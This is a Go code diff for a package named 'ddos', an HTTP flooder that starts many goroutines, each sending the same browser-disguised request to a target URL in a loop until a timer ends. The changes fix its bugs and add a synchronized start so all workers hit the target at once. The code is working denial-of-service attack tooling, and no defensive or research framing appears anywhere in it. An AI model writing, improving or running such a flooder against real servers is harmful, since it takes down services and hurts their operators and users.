@@ -1,17 +1,19 @@
 package ddos
 
 import (
+	"bufio"
 	"fmt"
 	"io"
 	"log"
 	"net/http"
+	"os"
 	"runtime"
 	"strings"
 	"sync"
 	"time"
 )
 
-func NewFlooder(url string, workerAmount, uint16, duration uint32) *flooder {
+func NewFlooder(url string, workerAmount uint16, duration uint32) *flooder {
 	ddos := &flooder{
 		url: url,
 		header: []string{
@@ -23,9 +25,10 @@ func NewFlooder(url string, workerAmount, uint16, duration uint32) *flooder {
 			"Cache-Control:max-age=0",
 			"User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
 		},
-		workerAmount: 0,
+		workerAmount: workerAmount,
 		client:       http.DefaultClient,
 		stopSignal:   make(chan bool),
+		startSignal:  make(chan bool),
 	}
 
 	ddos.SetDuration(duration)
@@ -45,7 +48,7 @@ type flooder struct {
 	client       *http.Client
 	workerAmount uint16
 	stopSignal   chan bool
-	startSignal  *chan bool
+	startSignal  chan bool
 	duration     time.Duration
 	wg           sync.WaitGroup
 	timer        *time.Timer
@@ -55,12 +58,25 @@ func (f *flooder) Flood() {
 	defaultRequest := f.configRequest()
 
 	for idx := uint16(0); idx < f.workerAmount; idx++ {
+		time.Sleep(time.Microsecond * 100)
 		f.wg.Add(1)
 		go func() {
 			defer f.wg.Done()
 			f.flood(defaultRequest)
 		}()
+		fmt.Printf("\rThreads [%.0f] are ready", float64(idx+1))
+		os.Stdout.Sync()
 	}
+
+	fmt.Printf("\nPlease [Enter] for continue")
+	_, err := bufio.NewReader(os.Stdin).ReadString('\n')
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	fmt.Println("Flood will end in " + f.duration.String() + " seconds.")
+	close(f.startSignal)
 
 	f.timer = time.NewTimer(f.duration)
 
@@ -97,9 +113,7 @@ func (f *flooder) flood(request *http.Request) {
 		case <-f.stopSignal:
 			return
 		default:
-			if f.startSignal != nil {
-				<-(*f.startSignal)
-			}
+			<-f.startSignal
 
 			resp, err := f.client.Do(request)
 			if err == nil {
@@ -129,11 +143,3 @@ func (f *flooder) SetWorkerAmount(workers uint16) {
 func (f *flooder) SetDuration(seconds uint32) {
 	f.duration = time.Duration(seconds) * time.Second
 }
-
-// func (f *flooder) WithStart() {
-// 	f.startSignal
-// }
-
-// func (f *flooder) WithRoutineCounter() {
-
-// }
